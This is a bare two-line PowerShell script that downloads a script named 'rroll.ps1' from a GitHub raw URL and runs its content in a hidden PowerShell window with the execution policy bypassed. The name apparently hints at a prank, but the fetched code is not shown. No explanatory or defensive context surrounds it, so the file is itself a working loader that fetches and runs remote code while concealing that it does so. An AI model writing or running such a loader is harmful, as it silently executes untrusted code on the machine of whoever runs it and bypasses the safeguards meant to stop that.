
$script = Invoke-WebRequest "https://github.com/Cancarutu2012/rroll/raw/refs/heads/main/rroll.ps1"
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$($script.Content)`""
